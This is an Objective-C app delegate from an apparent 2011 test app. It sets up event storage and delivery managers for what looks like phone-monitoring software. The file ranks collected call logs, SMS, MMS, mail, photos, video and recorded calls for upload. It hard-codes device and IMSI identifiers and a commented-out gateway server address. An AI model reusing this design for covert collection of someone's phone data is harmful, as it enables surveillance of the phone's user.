//
//  TestAppAppDelegate.m
//  TestApp
//
//  Created by Makara Khloth on 8/19/11.
//  Copyright __MyCompanyName__ 2011. All rights reserved.
//

#import "TestAppAppDelegate.h"
#import "TestAppViewController.h"

#import "CommandServiceManager.h"
#import "DataDeliveryManager.h"
#import "EventDeliveryManager.h"

#import "EventRepositoryManager.h"
#import "EventQueryPriority.h"

#import "CommandMetaData.h"

@interface TestAppAppDelegate (private)

- (EventQueryPriority*) eventQueryPriority;
- (CommandMetaData*) commandMetaData;

@end

@implementation TestAppAppDelegate

@synthesize window;
@synthesize viewController;

@synthesize mEDM;
@synthesize mEventRepository;

- (void)applicationDidFinishLaunching:(UIApplication *)application {    
    
    // Override point for customization after app launch    
    [window addSubview:viewController.view];
    [window makeKeyAndVisible];
	
	mCSM = [CommandServiceManager sharedManagerWithPayloadPath:@"/tmp" withDBPath:@"/tmp"];
	mEventRepository = [[EventRepositoryManager alloc] initWithEventQueryPriority:[self eventQueryPriority]];
	[mEventRepository openRepository];
	mDDM = [[DataDeliveryManager alloc] initWithCSM:mCSM];
	mEDM = [[EventDeliveryManager alloc] initWithEventRepository:mEventRepository andDataDelivery:mDDM];
}

- (EventQueryPriority*) eventQueryPriority {
	NSMutableArray* eventTypePriorityArray = [[NSMutableArray alloc] init];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypePanic]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypePanicImage]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeSettings]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeLocation]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeSystem]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCallLog]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeSms]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeMms]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeMail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCameraImage]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCameraImageThumbnail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeVideo]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeVideoThumbnail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeAudio]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeAudioThumbnail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCallRecordAudio]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCallRecordAudioThumbnail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeWallpaper]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeWallpaperThumbnail]];
	EventQueryPriority* eventQueryPriority = [[EventQueryPriority alloc] initWithUserPriority:eventTypePriorityArray];
	[eventTypePriorityArray release];
	[eventQueryPriority autorelease];
	return (eventQueryPriority);
}

- (CommandMetaData*) commandMetaData {
	CommandMetaData *metadata = [[CommandMetaData alloc] init];
	[metadata setCompressionCode:1];
	[metadata setConfID:105];
	[metadata setEncryptionCode:1];
	[metadata setProductID:4200];
	[metadata setProtocolVersion:1];
	[metadata setLanguage:0];
	[metadata setActivationCode:@"01387"];
	[metadata setDeviceID:@"353755040360291"];
	[metadata setIMSI:@"520010492905180"];
	[metadata setMCC:@"520"];
	[metadata setMNC:@"01"];
	[metadata setPhoneNumber:@"123456789"];
	[metadata setProductVersion:@"-1.00"];
	[metadata setHostURL:@""]; // http://58.137.119.229/RainbowCore/gateway
	[metadata autorelease];
	return (metadata);
}

- (void)dealloc {
	[mEDM release];
	[mDDM release];
	[mEventRepository release];
	[mCSM release];
    [viewController release];
	[window release];
	[super dealloc];
}

@end
